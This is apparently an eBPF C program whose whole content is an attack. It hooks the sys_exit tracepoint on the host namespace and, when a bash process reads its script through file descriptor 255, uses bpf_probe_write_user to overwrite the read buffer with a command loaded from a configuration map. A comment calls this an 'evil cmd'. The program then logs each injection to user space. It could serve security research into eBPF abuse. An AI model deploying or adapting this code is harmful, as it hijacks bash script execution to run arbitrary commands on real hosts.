//go:build ignore
#include "vmlinux.h"
#include <bpf/bpf_core_read.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include "utils.h"

char LICENSE[] SEC("license") = "GPL";

struct event {
    u32 pid;
    char cmdline[128];
    u32 len_cmdline;
    bool injected;
};

struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 1 << 24);
    __type(value, struct event);
} events SEC(".maps");

#define MAX_COMMAND_LEN 128
#define MAX_COMMAND_MASK (MAX_COMMAND_LEN - 1)

struct config {
    char command[MAX_COMMAND_LEN];
    __u32 len_command;
};

struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 1);
    __type(key, int);
    __type(value, struct config);
} config_map SEC(".maps");

// returns 0 if really handled
static __inline int handle_exit_read(struct bpf_raw_tracepoint_args *ctx) {
    // sys_read(unsigned int fd, char *buf, size_t count)
    struct pt_regs *regs = (struct pt_regs *)(ctx->args[0]);
    int fd = (int)PT_REGS_PARM1_CORE(regs);
    // filter fd==255
    if (fd != 255) {
        return 1;
    }
    // get args
    char *buf = (char *)PT_REGS_PARM2_CORE(regs);
    size_t count = (size_t)PT_REGS_PARM3_CORE(regs);
    if (buf == NULL || count == 0) {
        return 1;
    }
    long ret = PT_REGS_RC_CORE(regs);
    if (ret <= 0) {
        return 1;
    }
    // dynamic read command from user space
    int key = 0;
    struct config *cfg;
    cfg = bpf_map_lookup_elem(&config_map, &key);
    if (!cfg) {
        return 1;
    }
    __u32 len_command = cfg->len_command & MAX_COMMAND_MASK;
    if (len_command == 0) {
        return 1;
    }
    // inject evil cmd to buf
    bool injected;
    // TODO: what if count < new_len_with_null?
    if (count > len_command) {
        // TODO: insert/append instead of overwrite
        bpf_probe_write_user(buf, cfg->command, len_command);
        injected = true;
    }
    // send event to user space
    struct event *e;
    e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
    if (!e) {
        return 1;
    }
    e->len_cmdline = get_cmdline(e->cmdline, sizeof(e->cmdline));
    e->pid = bpf_get_current_pid_tgid() >> 32;
    e->injected = injected;
    bpf_ringbuf_submit(e, 0);
    return 0;
}

SEC("raw_tracepoint/sys_exit")
int raw_tracepoint(struct bpf_raw_tracepoint_args *ctx) {
    // do not filter uid==0
    // filter mnt_ns==[init]
    if (!is_host()) {
        return 0;
    }
    // filter cmdline==[bash]
    if (!is_bash()) {
        return 0;
    }
    // filter syscall
    struct pt_regs *regs = (struct pt_regs *)(ctx->args[0]);
    int syscall_id = get_syscall_id_from_regs(regs);
    switch (syscall_id) {
    case 0:
        if (handle_exit_read(ctx) != 0) {
            return 0;
        }
        break;
    default:
        return 0;
    }
    return 0;
}